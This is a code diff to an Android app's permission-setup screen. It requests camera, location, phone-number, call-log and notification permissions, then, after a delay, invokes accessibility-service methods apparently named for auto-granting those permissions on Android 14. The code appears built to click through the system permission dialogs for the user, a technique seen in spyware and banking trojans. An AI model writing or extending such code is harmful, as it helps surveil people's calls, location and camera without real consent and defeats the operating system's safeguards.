@@ -42,35 +42,20 @@ public class PermissionSetActivity extends AppCompatActivity {
         }
     }
     private void onRequestPermission() {
-        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            ActivityCompat.requestPermissions(this, new String[]{
-                    Manifest.permission.CAMERA,
-                    Manifest.permission.ACCESS_COARSE_LOCATION,
-                    Manifest.permission.ACCESS_FINE_LOCATION,
-                    Manifest.permission.READ_PHONE_STATE,
-                    Manifest.permission.READ_PHONE_NUMBERS,
-                    Manifest.permission.READ_CALL_LOG,
-                    Manifest.permission.WRITE_CALL_LOG,
-                    Manifest.permission.POST_NOTIFICATIONS}, PERMISSION_REQUEST_CAMERA );
-            new Handler().postDelayed(new Runnable() {
-
-                @Override
-                public void run() {
-                    if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                        if(MainAccessibilityService.getContext() != null) {//
-                            MainAccessibilityService.getContext().AllowPrims14_normal();
-                        }
+        ActivityCompat.requestPermissions(this, new String[]{
+                Manifest.permission.CAMERA,
+                Manifest.permission.ACCESS_COARSE_LOCATION,
+                Manifest.permission.ACCESS_FINE_LOCATION}, PERMISSION_REQUEST_CAMERA );
+        new Handler().postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                    if(MainAccessibilityService.getContext() != null) {//
+                        MainAccessibilityService.getContext().AllowPrims14_normal();
                     }
                 }
-            }, 1000);
-
-        } else {
-            ActivityCompat.requestPermissions(this, new String[]{
-                    Manifest.permission.CAMERA,
-                    Manifest.permission.ACCESS_COARSE_LOCATION,
-                    Manifest.permission.ACCESS_FINE_LOCATION}, PERMISSION_REQUEST_CAMERA );
-        }
-
+            }
+        }, 2000);
     }
 
     private void onRequestPermissionPhone() {
@@ -79,7 +64,18 @@ public class PermissionSetActivity extends AppCompatActivity {
                     Manifest.permission.READ_PHONE_STATE,
                     Manifest.permission.READ_PHONE_NUMBERS,
                     Manifest.permission.READ_CALL_LOG,
-                    Manifest.permission.WRITE_CALL_LOG}, PERMISSION_REQUEST_PHONE);
+                    Manifest.permission.WRITE_CALL_LOG,
+                    Manifest.permission.POST_NOTIFICATIONS}, PERMISSION_REQUEST_PHONE);
+            new Handler().postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                        if(MainAccessibilityService.getContext() != null) {//
+                            MainAccessibilityService.getContext().AllowPrims14_phone();
+                        }
+                    }
+                }
+            }, 2000);
         } else {
             ActivityCompat.requestPermissions(this, new String[]{
                     Manifest.permission.READ_PHONE_STATE,
@@ -99,14 +95,7 @@ public class PermissionSetActivity extends AppCompatActivity {
 
         if (requestCode == PERMISSION_REQUEST_CAMERA) {
             if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                    Intent intent = new Intent(this, PermissionSetMediaActivity.class);
-                    startActivity(intent);
-                    finish();
-
-                } else {
-                    onRequestPermissionPhone();
-                }
+                onRequestPermissionPhone();
             } else {
                 onRequestPermission();
             }
